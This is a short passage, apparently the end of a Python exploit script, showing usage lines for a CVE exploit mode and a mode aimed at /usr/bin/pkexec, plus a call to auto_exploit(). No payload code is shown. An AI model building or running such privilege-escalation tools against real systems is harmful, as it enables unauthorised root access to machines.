            print(f"  {sys.argv[0]} cve_2026_41651      — run CVE exploit")
            print(f"  {sys.argv[0]} /usr/bin/pkexec     — run target-specific")
    else:
        auto_exploit()


if __name__ == "__main__":
    main()
